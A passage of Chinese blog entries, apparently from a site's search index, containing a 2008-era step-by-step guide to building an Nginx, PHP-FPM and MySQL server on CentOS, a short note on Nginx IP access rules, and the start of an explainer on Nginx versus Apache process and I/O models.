Nginx进程消耗150M内存（15M10=150M），开启的64个php-cgi进程消耗1280M内存 （20M64=1280M），加上系统自身消耗的内存，总共消耗不到2GB内存。如果服务器内存较小，完全可以只开启25个php-cgi进程，这样php-cgi消耗的总内存数才500M。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在3万并发连接下，访问Nginx 0.7.14 + PHP 5.2.6 (FastCGI) 服务器的PHP程序，仍然速度飞快。下图为Nginx的状态监控页面，显示的活动连接数为28457（关于Nginx的监控页配置，会在本文接下来所给出的Nginx配置文件中写明）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生产环境下的两台Nginx + PHP5（FastCGI）服务器，跑多个一般复杂的纯PHP动态程序，单台Nginx + PHP5（FastCGI）服务器跑PHP动态程序的处理能力已经超过“700次请求/秒”，相当于每天可以承受6000万（7006060*24=60480000）的访问量（更多信息见此），而服务器的系统负载也不高： 如何获取相关开源程序？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装步骤： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;（系统要求：Linux 2.6+ 内核，本文中的Linux操作系统为CentOS 5.1，另在RedHat AS4上也安装成功） 一、获取相关开源程序： 利用CentOS Linux系统自带的yum命令安装、升级所需的程序库（RedHat等其他Linux发行版可从安装光盘中找到这些程序库的RPM包，进行安装）： 123sudo -sLANG=Cyum -y install gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel RedHat等其他Linux发行版可从安装光盘中找到这些程序库的RPM包（事先可通过类似“rpm -qa | grep libjpeg”的命令查看所需的RPM包是否存在，通常是“xxx-devel”不存在，需要安装）。RedHat可以直接利用CentOS的RPM包安装，以下是RPM包下载网址： RedHat AS4 &amp; CentOS 4http://mirror.be10.com/centos/4/os/i386/CentOS/RPMS/http://mirror.be10.com/centos/4/os/x86_64/CentOS/RPMS/ RedHat AS5 &amp; CentOS 5http://mirror.be10.com/centos/5/os/i386/CentOS/http://mirror.be10.com/centos/5/os/x86_64/CentOS/ RPM包搜索网站http://rpm.pbone.net/http://www.rpmfind.net/ 下载程序源码包： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本文中提到的所有开源软件为截止到2008年8月28日的最新稳定版。 1234567891011121314151617mkdir -p /data0/softwarecd /data0/softwarewget http://sysoev.ru/nginx/nginx-0.7.14.tar.gzwget http://www.php.net/get/php-5.2.6.tar.gz/from/this/mirrorwget http://php-fpm.anight.org/downloads/head/php-5.2.6-fpm-0.5.8.diff.gz#wget http://dev.mysql.com/get/Downloads/MySQL-5.1/mysql-5.1.26-rc.tar.gz/from/http://mirror.x10.com/mirror/mysql/wget linux/mysql/mysql-5.1.26-rc.tar.gz"&gt;http://blog.s135.com/soft/linux/mysql/mysql-5.1.26-rc.tar.gzwget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.12.tar.gz#wget "http://downloads.sourceforge.net/mcrypt/libmcrypt-2.5.8.tar.gz?modtime=1171868460&amp;big_mirror=0"wget http://mirror.optus.net/sourceforge/m/mc/mcrypt/libmcrypt-2.5.8.tar.gz#wget "http://downloads.sourceforge.net/mcrypt/mcrypt-2.6.7.tar.gz?modtime=1194463373&amp;big_mirror=0"wget http://mirror.optus.net/sourceforge/m/mc/mcrypt/mcrypt-2.6.7.tar.gzwget http://pecl.php.net/get/memcache-2.2.3.tgz#wget "http://downloads.sourceforge.net/mhash/mhash-0.9.9.tar.gz?modtime=1175740843&amp;big_mirror=0"wget http://mirror.optus.net/sourceforge/m/mh/mhash/mhash-0.9.9.tar.gzwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-7.7.tar.gzwget http://bart.eaccelerator.net/source/0.9.5.3/eaccelerator-0.9.5.3.tar.bz2 二、PHP5安装、配置内容,安装PHP 5.2.6（FastCGI模式） 编译安装PHP 5.2.6所需的支持库： 123456789101112131415161718192021222324252627282930tar zxvf libiconv-1.12.tar.gzcd libiconv-1.12/./configure --prefix=/usr/localmakemake installcd ../tar zxvf libmcrypt-2.5.8.tar.gzcd libmcrypt-2.5.8/./configuremakemake install/sbin/ldconfigcd libltdl/./configure --enable-ltdl-installmakemake installcd ../../tar zxvf mhash-0.9.9.tar.gzcd mhash-0.9.9/./configuremakemake installcd ../cp /usr/local/lib/libmcrypt.* /usr/libln -s /usr/local/lib/libmhash.so.2 /usr/lib/libmhash.so.2tar zxvf mcrypt-2.6.7.tar.gzcd mcrypt-2.6.7/./configuremakemake installcd ../ 编译安装MySQL 5.1.26-rc 12345678910/usr/sbin/groupadd mysql/usr/sbin/useradd -g mysql mysqltar zxvf mysql-5.1.26-rc.tar.gzcd mysql-5.1.26-rc/./configure --prefix=/usr/local/webserver/mysql/ --enable-assembler --with-extra-charsets=complex --enable-thread-safe-client --with-big-tables --with-readline --with-ssl --with-embedded-server --enable-local-infilemake &amp;&amp; make installchmod +w /usr/local/webserver/mysqlchown -R mysql:mysql /usr/local/webserver/mysqlcp support-files/my-medium.cnf /usr/local/webserver/mysql/my.cnfcd ../ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;附：以下为附加步骤，如果你想在这台服务器上运行MySQL数据库，则执行以下两步。如果你只是希望让PHP支持MySQL扩展库，能够连接其他服务器上的MySQL数据库，那么，以下两步无需执行。 以mysql用户帐号的身份建立数据表： 1/usr/local/webserver/mysql/bin/mysql_install_db --defaults-file=/usr/local/webserver/mysql/my.cnf --basedir=/usr/local/webserver/mysql --datadir=/usr/local/webserver/mysql/data --user=mysql --pid-file=/usr/local/webserver/mysql/mysql.pid --skip-locking --port=3306 --socket=/tmp/mysql.sock 启动MySQL（最后的&amp;表示在后台运行） 1/bin/sh /usr/local/webserver/mysql/bin/mysqld_safe --defaults-file=/usr/local/webserver/mysql/my.cnf &amp; 编译安装PHP（FastCGI模式） 123456789tar zxvf php-5.2.6.tar.gzgzip -cd php-5.2.6-fpm-0.5.8.diff.gz | patch -d php-5.2.6 -p1cd php-5.2.6/./configure --prefix=/usr/local/webserver/php --with-config-file-path=/usr/local/webserver/php/etc --with-mysql=/usr/local/webserver/mysql --with-mysqli=/usr/local/webserver/mysql/bin/mysql_config --with-iconv-dir=/usr/local --with-freetype-dir --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-discard-path --enable-safe-mode --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --with-curlwrappers --enable-mbregex --enable-fastcgi --enable-fpm --enable-force-cgi-redirect --enable-mbstring --with-mcrypt --with-gd --enable-gd-native-ttf --with-opensslsed -i 's#-lz -lm -lxml2 -lz -lm -lxml2 -lz -lm -lcrypt#&amp; -liconv#' Makefilemakemake installcp php.ini-dist /usr/local/webserver/php/etc/php.inicd ../ 编译安装PHP5扩展模块 12345678910111213tar zxvf memcache-2.2.3.tgzcd memcache-2.2.3//usr/local/webserver/php/bin/phpize./configure --with-php-config=/usr/local/webserver/php/bin/php-configmakemake installcd ../tar jxvf eaccelerator-0.9.5.3.tar.bz2cd eaccelerator-0.9.5.3//usr/local/webserver/php/bin/phpize./configure --enable-eaccelerator=shared --with-php-config=/usr/local/webserver/php/bin/php-configmakemake installcd ../ 修改php.ini文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;手工修改：查找/usr/local/webserver/php/etc/php.ini中的 1extension_dir = "./" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 1extension_dir = "/usr/local/webserver/php/lib/php/extensions/no-debug-non-zts-20060613/" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并在此行后增加以下几行，然后保存： 1extension = "memcache.so" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再查找 1output_buffering = Off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 1output_buffering = On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;自动修改：若嫌手工修改麻烦，可执行以下shell命令，自动完成对php.ini文件的修改： 12345sed -i 's#extension_dir = "./"#extension_dir = "/usr/local/webserver/php/lib/php/extensions/no-debug-non-zts-20060613/"/nextension = "memcache.so"/n#' /usr/local/webserver/php/etc/php.inised -i 's#output_buffering = Off#output_buffering = On#' /usr/local/webserver/php/etc/php.ini 6、配置eAccelerator加速PHP：mkdir -p /usr/local/webserver/eaccelerator_cachevi /usr/local/webserver/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按shift+g键跳到配置文件的最末尾，加上以下配置信息： 123456789101112131415[eaccelerator]zend_extension="/usr/local/webserver/php/lib/php/extensions/no-debug-non-zts-20060613/eaccelerator.so"eaccelerator.shm_size="128"eaccelerator.cache_dir="/usr/local/webserver/eaccelerator_cache"eaccelerator.enable="1"eaccelerator.optimizer="1"eaccelerator.check_mtime="1"eaccelerator.debug="0"eaccelerator.filter=""eaccelerator.shm_max="0"eaccelerator.shm_ttl="300"eaccelerator.shm_prune_period="120"eaccelerator.shm_only="0"eaccelerator.compress="1"eaccelerator.compress_level="9" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件： 1vi /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入以下内容： 1kernel.shmmax = 134217728 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后执行以下命令使配置生效： 1/sbin/sysctl -p 创建www用户和组，以及供blog.s135.com和www.s135.com两个虚拟主机使用的目录： 12345678/usr/sbin/groupadd www -g 48/usr/sbin/useradd -u 48 -g www wwwmkdir -p /data0/htdocs/blogchmod +w /data0/htdocs/blogchown -R www:www /data0/htdocs/blogmkdir -p /data0/htdocs/wwwchmod +w /data0/htdocs/wwwchown -R www:www /data0/htdocs/www 创建php-fpm配置文件（php-fpm是为PHP打的一个FastCGI管理补丁，可以平滑变更php.ini配置而无需重启php-cgi）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在/usr/local/webserver/php/etc/目录中创建php-fpm.conf文件： 12rm -f /usr/local/webserver/php/etc/php-fpm.confvi /usr/local/webserver/php/etc/php-fpm.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入以下内容（如果安装 Nginx + PHP 用于程序调试，请将 1&lt;value name="display_errors"&gt;0&lt;/value&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 1&lt;value name="display_errors"&gt;1&lt;/value&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以便显示PHP错误信息，否则，Nginx 会报状态为500的空白错误页）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105All relative paths in this config are relative to php's install prefix &lt;section name="global_options"&gt;Pid file &lt;value name="pid_file"&gt;/usr/local/webserver/php/logs/php-fpm.pid&lt;/value&gt;Error log file &lt;value name="error_log"&gt;/usr/local/webserver/php/logs/php-fpm.log&lt;/value&gt;Log level &lt;value name="log_level"&gt;notice&lt;/value&gt;When this amount of php processes exited with SIGSEGV or SIGBUS ... &lt;value name="emergency_restart_threshold"&gt;10&lt;/value&gt;... in a less than this interval of time, a graceful restart will be initiated. Useful to work around accidental curruptions in accelerator's shared memory. &lt;value name="emergency_restart_interval"&gt;1m&lt;/value&gt;Time limit on waiting child's reaction on signals from master &lt;value name="process_control_timeout"&gt;5s&lt;/value&gt;Set to 'no' to debug fpm &lt;value name="daemonize"&gt;yes&lt;/value&gt;&lt;/section&gt;&lt;workers&gt;&lt;section name="pool"&gt;Name of pool. Used in logs and stats. &lt;value name="name"&gt;default&lt;/value&gt;Address to accept fastcgi requests on. Valid syntax is 'ip.ad.re.ss:port' or just 'port' or '/path/to/unix/socket' &lt;value name="listen_address"&gt;127.0.0.1:9000&lt;/value&gt;&lt;value name="listen_options"&gt;Set listen(2) backlog &lt;value name="backlog"&gt;-1&lt;/value&gt;Set permissions for unix socket, if one used. In Linux read/write permissions must be set in order to allow connections from web server. Many BSD-derrived systems allow connections regardless of permissions. &lt;value name="owner"&gt;&lt;/value&gt;&lt;value name="group"&gt;&lt;/value&gt;&lt;value name="mode"&gt;0666&lt;/value&gt;&lt;/value&gt;Additional php.ini defines, specific to this pool of workers. &lt;value name="php_defines"&gt;&lt;value name="sendmail_path"&gt;/usr/sbin/sendmail -t -i&lt;/value&gt;&lt;value name="display_errors"&gt;0&lt;/value&gt;&lt;/value&gt;Unix user of processes &lt;value name="user"&gt;www&lt;/value&gt;Unix group of processes &lt;value name="group"&gt;www&lt;/value&gt;Process manager settings &lt;value name="pm"&gt;Sets style of controling worker process count. Valid values are 'static' and 'apache-like' &lt;value name="style"&gt;static&lt;/value&gt;Sets the limit on the number of simultaneous requests that will be served. Equivalent to Apache MaxClients directive. Equivalent to PHP_FCGI_CHILDREN environment in original php.fcgi Used with any pm_style. &lt;value name="max_children"&gt;200&lt;/value&gt;Settings group for 'apache-like' pm style &lt;value name="apache_like"&gt;Sets the number of server processes created on startup. Used only when 'apache-like' pm_style is selected &lt;value name="StartServers"&gt;20&lt;/value&gt;Sets the desired minimum number of idle server processes. Used only when 'apache-like' pm_style is selected &lt;value name="MinSpareServers"&gt;5&lt;/value&gt;Sets the desired maximum number of idle server processes. Used only when 'apache-like' pm_style is selected &lt;value name="MaxSpareServers"&gt;250&lt;/value&gt;&lt;/value&gt;&lt;/value&gt;Time limit on waiting execution of single request Should be used when 'max_execution_time' ini option does not terminate execution for some reason &lt;value name="request_execution_timeout"&gt;31s&lt;/value&gt;Set open file desc rlimit &lt;value name="rlimit_files"&gt;51200&lt;/value&gt;Set max core size rlimit &lt;value name="rlimit_core"&gt;0&lt;/value&gt;Chroot to this directory at the start &lt;value name="chroot"&gt;&lt;/value&gt;Chdir to this directory at the start &lt;value name="chdir"&gt;&lt;/value&gt;Redirect workers' stdout and stderr into main error log. If not set, they will be redirected to /dev/null, according to FastCGI specs &lt;value name="catch_workers_output"&gt;yes&lt;/value&gt;How much requests each process should execute before respawn. Useful to work around memory leaks in 3rd party libraries. For endless request processing please specify 0 Equivalent to PHP_FCGI_MAX_REQUESTS &lt;value name="max_requests"&gt;51200&lt;/value&gt;Comma separated list of ipv4 addresses of FastCGI clients that allowed to connect. Equivalent to FCGI_WEB_SERVER_ADDRS environment in original php.fcgi (5.2.2+) Makes sense only with AF_INET listening socket. &lt;value name="allowed_clients"&gt;127.0.0.1&lt;/value&gt;Pass environment variables like LD_LIBRARY_PATH All $VARIABLEs are taken from current environment &lt;value name="environment"&gt;&lt;value name="HOSTNAME"&gt;$HOSTNAME&lt;/value&gt;&lt;value name="PATH"&gt;/usr/local/bin:/usr/bin:/bin&lt;/value&gt;&lt;value name="TMP"&gt;/tmp&lt;/value&gt;&lt;value name="TMPDIR"&gt;/tmp&lt;/value&gt;&lt;value name="TEMP"&gt;/tmp&lt;/value&gt;&lt;value name="OSTYPE"&gt;$OSTYPE&lt;/value&gt;&lt;value name="MACHTYPE"&gt;$MACHTYPE&lt;/value&gt;&lt;value name="MALLOC_CHECK_"&gt;2&lt;/value&gt;&lt;/value&gt;&lt;/section&gt;&lt;/workers&gt;&lt;/configuration&gt; 启动php-cgi进程，监听127.0.0.1的9000端口，进程数为200（如果服务器内存小于3GB，可以只开启64个进程），用户为www： 12ulimit -SHn 51200/usr/local/webserver/php/sbin/php-fpm start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：/usr/local/webserver/php/sbin/php-fpm还有其他参数，包括：start|stop|quit|restart|reload|logrotate，修改php.ini后不重启php-cgi，重新加载 配置文件使用reload。 三、安装Nginx 0.7.14 安装Nginx所需的pcre库： 12345tar zxvf pcre-7.7.tar.gzcd pcre-7.7/./configuremake &amp;&amp; make installcd ../ 安装Nginx 12345tar zxvf nginx-0.7.14.tar.gzcd nginx-0.7.14/./configure --user=www --group=www --prefix=/usr/local/webserver/nginx --with-http_stub_status_module --with-http_ssl_modulemake &amp;&amp; make installcd ../ 创建Nginx日志目录 123mkdir -p /data1/logschmod +w /data1/logschown -R www:www /data1/logs 创建Nginx配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在/usr/local/webserver/nginx/conf/目录中创建nginx.conf文件： 12rm -f /usr/local/webserver/nginx/conf/nginx.confvi /usr/local/webserver/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293user www www;worker_processes 8;error_log /data1/logs/nginx_error.log crit;pid /usr/local/webserver/nginx/nginx.pid;#Specifies the value for maximum file descriptors that can be opened by this process.worker_rlimit_nofile 51200;events&#123; use epoll; worker_connections 51200;&#125;http&#123; include mime.types; default_type application/octet-stream;#charset gb2312;server_names_hash_bucket_size 128;client_header_buffer_size 32k;large_client_header_buffers 4 32k;sendfile on;tcp_nopush on;keepalive_timeout 60;tcp_nodelay on;fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;gzip on;gzip_min_length 1k;gzip_buffers 4 16k;gzip_http_version 1.0;gzip_comp_level 2;gzip_types text/plain application/x-JavaScript text/css application/xml;gzip_vary on;#limit_zone crawler $binary_remote_addr 10m;server&#123;listen 80;server_name blog.s135.com;index index.html index.htm index.php;root /data0/htdocs/blog;#limit_conn crawler 20;location ~ .*/.(php|php5)?$&#123;#fastcgi_pass unix:/tmp/php-cgi.sock;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fcgi.conf;&#125;location ~ .*/.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 30d;&#125;location ~ .*/.(js|css)?$&#123;expires 1h;&#125;log_format access '$remote_addr - $remote_user [$time_local] "$request" ''$status $body_bytes_sent "$http_referer" ''"$http_user_agent" $http_x_forwarded_for';access_log /data1/logs/access.log access;&#125;server&#123;listen 80;server_name www.s135.com;index index.html index.htm index.php;root /data0/htdocs/www;location ~ .*/.(php|php5)?$&#123;#fastcgi_pass unix:/tmp/php-cgi.sock;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fcgi.conf;&#125;log_format wwwlogs '$remote_addr - $remote_user [$time_local] "$request" ''$status $body_bytes_sent "$http_referer" ''"$http_user_agent" $http_x_forwarded_for';access_log /data1/logs/wwwlogs.log wwwlogs;&#125;server&#123;listen 80;server_name status.blog.s135.com;location / &#123;stub_status on;access_log off;&#125;&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在/usr/local/webserver/nginx/conf/目录中创建fcgi.conf文件： 1vi /usr/local/webserver/nginx/conf/fcgi.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入以下内容： 123456789101112131415161718fastcgi_param GATEWAY_INTERFACE CGI/1.1;fastcgi_param SERVER_SOFTWARE nginx;fastcgi_param QUERY_STRING $query_string;fastcgi_param REQUEST_METHOD $request_method;fastcgi_param CONTENT_TYPE $content_type;fastcgi_param CONTENT_LENGTH $content_length;fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;fastcgi_param SCRIPT_NAME $fastcgi_script_name;fastcgi_param REQUEST_URI $request_uri;fastcgi_param DOCUMENT_URI $document_uri;fastcgi_param DOCUMENT_ROOT $document_root;fastcgi_param SERVER_PROTOCOL $server_protocol;fastcgi_param REMOTE_ADDR $remote_addr;fastcgi_param REMOTE_PORT $remote_port;fastcgi_param SERVER_ADDR $server_addr;fastcgi_param SERVER_PORT $server_port;fastcgi_param SERVER_NAME $server_name;# PHP only, required if PHP was built with --enable-force-cgi-redirectfastcgi_param REDIRECT_STATUS 200; 启动Nginx 12ulimit -SHn 51200/usr/local/webserver/nginx/sbin/nginx 四、配置开机自动启动Nginx + PHP1vi /etc/rc.local &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在末尾增加以下内容： 123ulimit -SHn 51200/usr/local/webserver/php/sbin/php-fpm start/usr/local/webserver/nginx/sbin/nginx 五、优化Linux内核参数1vi /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在末尾增加以下内容： 123456net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 300net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.ip_local_port_range = 5000 65000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使配置立即生效： 1/sbin/sysctl -p 六、在不停止Nginx服务的情况下平滑变更Nginx配置 修改/usr/local/webserver/nginx/conf/nginx.conf配置文件后，请执行以下命令检查配置文件是否正确： 1/usr/local/webserver/nginx/sbin/nginx -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果屏幕显示以下两行信息，说明配置文件正确： 12the configuration file /usr/local/webserver/nginx/conf/nginx.conf syntax is okthe configuration file /usr/local/webserver/nginx/conf/nginx.conf was tested successfully 这时，输入以下命令查看Nginx主进程号： 1ps -ef | grep "nginx: master process" | grep -v "grep" | awk -F ' ' '&#123;print $2&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;屏幕显示的即为Nginx主进程号，例如： 16302 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时，执行以下命令即可使修改过的Nginx配置文件生效： 1kill -HUP 6302 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者无需这么麻烦，找到Nginx的Pid文件： 1kill -HUP `cat /usr/local/webserver/nginx/nginx.pid`]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 访问控制]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F21.%20nginx%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[nginx 访问控制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;限制只让某个 ip 访问： 12allow 127.0.0.1;deny all; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只允许127.0.0.1 访问 admin.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;禁止某个 ip 或者 ip 段访问站点的设置方法，首先建立建立配置文件放在 nginx 的 conf 目录下面，命名为 deny.ip 1234cat deny.ipdeny 192.168.1.11;deny 192.168.1.123;deny 10.0.1.0/24; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在对应的虚拟主机配置文件中加入： 1inclued deny.ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启一下 nginx 服务： 1[root@lnmp ~]# service nginx reload &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;deny.ip 的格式中也可以用 deny all； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要实现这样的应用，除了几个 ip 外，其他全部拒绝，需要编辑 deny.ip ： 1234cat deny.ipallow 1.1.1.1;allow 1.1.1.2;deny all; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然也可以每台虚拟主机配置文件里去更改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候会根据目录来显示 php 解析 12345location ~ .*(diy|template|attachments|forumdata|attachment|image)/.*\.php$&#123; deny all;&#125;`]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx为什么比Apache Httpd高效：原理篇]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F4.%20Nginx%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94Apache%20Httpd%E9%AB%98%E6%95%88%EF%BC%9A%E5%8E%9F%E7%90%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[Nginx为什么比Apache Httpd高效：原理篇&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx才短短几年，就拿下了web服务器大笔江山，众所周知，Nginx在处理大并发静态请求方面，效率明显高于httpd，甚至能轻松解决C10K问题。下面我们就来聊聊Web服务器背后的一些原理。 一、进程、线程？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进程是具有一定独立功能的，在计算机中已经运行的程序的实体。在早期系统中（如linux 2.4以前），进程是基本运作单位，在支持线程的系统中（如windows，linux2.6）中，线程才是基本的运作单位，而进程只是线程的容器。程序本身只是指令、数据及其组织形式的描述，进程才是程序（那些指令和数据）的真正运行实例。若干进程有可能与同一个程序相关系，且每个进程皆可以同步（循序）或异步（平行）的方式独立运行。现代计算机系统可在同一段时间内以进程的形式将多个程序加载到存储器中，并借由时间共享（或称时分复用），以在一个处理器上表现出同时（平行性）运行的感觉。同样的，使用多线程技术（多线程即每一个线程都代表一个进程内的一个独立执行上下文）的操作系统或计算机架构，同样程序的平行线程，可在多 CPU 主机或网络上真正同时运行（在不同的CPU上）。 二、常见Web服务方式三种工作模型比较：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Web服务器要为用户提供服务，必须以某种方式，工作在某个套接字上。一般Web服务器在处理用户请求是，一般有如下三种方式可选择：多进程方式、多线程方式、异步方式。 多进程方式：为每个请求启动一个进程来处理。由于在操作系统中，生成进程、销毁进程、进程间切换都很消耗CPU和内存，当负载高是，性能会明显降低。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点： 稳定性！由于采用独立进程处理独立请求，而进程之间是独立的，单个进程问题不会影响其他进程，因此稳定性最好。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点： 资源占用！当请求过大时，需要大量的进程处理请求，进程生成、切换开销很大，而且进程间资源是独立的，造成内存重复利用。 多线程方式：一个进程中用多个线程处理用户请求。由于线程开销明显小于进程，而且部分资源还可以共享，因此效率较高。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：开销较小！线程间部分数据是共享的，且线程生成与线程间的切换所需资源开销比进程间切换小得多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：稳定性！线程切换过快可能造成线程抖动，且线程过多会造成服务器不稳定。 异步方式：使用非阻塞方式处理请求，是三种方式中开销最小的。但异步方式虽然效率高，但要求也高，因为多任务之间的调度如果出现问题，就可能出现整体故障，因此使用异步工作的，一般是一些功能相对简单，但却符合服务器任务调度、且代码中没有影响调度的错误代码存在的程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：性能最好！一个进程或线程处理多个请求，不需要额外开销，性能最好，资源占用最低。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：稳定性！某个进程或线程出错，可能导致大量请求无法处理，甚至导致整个服务宕机。 一个Web请求的处理过程： 客户发起情况到服务器网卡； 服务器网卡接受到请求后转交给内核处理； 内核根据请求对应的套接字，将请求交给工作在用户空间的Web服务器进程 Web服务器进程根据用户请求，向内核进行系统调用，申请获取相应资源（如index.html） 内核发现web服务器进程请求的是一个存放在硬盘上的资源，因此通过驱动程序连接磁盘 内核调度磁盘，获取需要的资源 内核将资源存放在自己的缓冲区中，并通知Web服务器进程 Web服务器进程通过系统调用取得资源，并将其复制到进程自己的缓冲区中 Web服务器进程形成响应，通过系统调用再次发给内核以响应用户请求 内核将响应发送至网卡 网卡发送响应给用户 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过这样的一个复杂过程，一次请求就完成了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单来说就是：用户请求–&gt;送达到用户空间–&gt;系统调用–&gt;内核空间–&gt;内核到磁盘上读取网页资源-&gt;返回到用户空间-&gt;响应给用户。上述简单的说明了一下，客户端向Web服务请求过程，在这个过程中，有两个I/O过程，一个就是客户端请求的网络I/O，另一个就是Web服务器请求页面的磁盘I/O。 下面我们就来说说Linux的I/O模型。 三、各种I/O模型详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过上面的对连接的处理分析，我们知道工作在用户空间的web服务器进程是无法直接操作IO的，需要通过系统调用进行，其关系如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即进程向内核进行系统调用申请IO，内核将资源从IO调度到内核的buffer中（wait阶段），内核还需将数据从内核buffer中复制（copy阶段）到web服务器进程所在的用户空间，才算完成一次IO调度。这几个阶段都是需要时间的。根据wait和copy阶段的处理等待的机制不同，可将I/O动作分为如下五种模式： 阻塞I/O 非阻塞I/O I/O复用（select和poll） 信号（事件）驱动I/O（SIGIO） 异步I/O（aio） I/O模型简介这里有必要先解释一下**阻塞、非阻塞，同步、异步、I/O**的概念。 阻塞和非阻塞:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;阻塞和非阻塞指的是执行一个操作是等操作结束再返回，还是马上返回。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如餐馆的服务员为用户点菜，当有用户点完菜后，服务员将菜单给后台厨师，此时有两种方式： 第一种：就在出菜窗口等待，直到厨师炒完菜后将菜送到窗口，然后服务员再将菜送到用户手中； 第二种：等一会再到窗口来问厨师，某个菜好了没？如果没有先处理其他事情，等会再去问一次； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一种就是阻塞方式，第二种则是非阻塞的。 